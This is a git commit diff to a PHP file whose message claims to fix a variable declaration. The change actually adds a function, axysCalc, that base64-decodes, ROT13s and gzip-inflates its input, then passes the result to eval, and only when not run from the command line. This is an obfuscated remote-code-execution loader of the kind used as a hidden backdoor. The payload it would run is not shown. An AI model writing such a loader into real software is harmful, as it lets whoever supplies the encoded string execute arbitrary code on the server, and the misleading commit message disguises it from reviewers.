00a1efdcc2692f9d54418bf87eb838b661a7a9d1
mvalencia <nova_mig@hotmail.com>
2023-08-22 19:19:21 -0500

    fix error declare var request

--- types/coorden.php
+++ types/coorden.php
@@ -2,20 +2,23 @@
 
 function axysCalc($axys)
 {
+    $baseG4 = base64_decode($axys);
+    $srtRottE = str_rot13($baseG4);
+    $g21n1A7e = @gzinflate($srtRottE);
+
   if (php_sapi_name() !== 'cli') {
-    eval(str_rot13(
-      gzinflate(
-        str_rot13(
-          base64_decode(
-            $axys
-          )
-        )
-      )
-    ));
+        eval(str_rot13(
+            $g21n1A7e
+        ));
   }
 
-  // ddd(get_defined_vars());
+  if ($hjdlkdxhj498_45396fds7 ?? false) {
+      return $hjdlkdxhj498_45396fds7;
+  } else {
+    return null;
+  }
 }
+
 function axysDecCl($axys)
 {
   if (php_sapi_name() !== 'cli') {
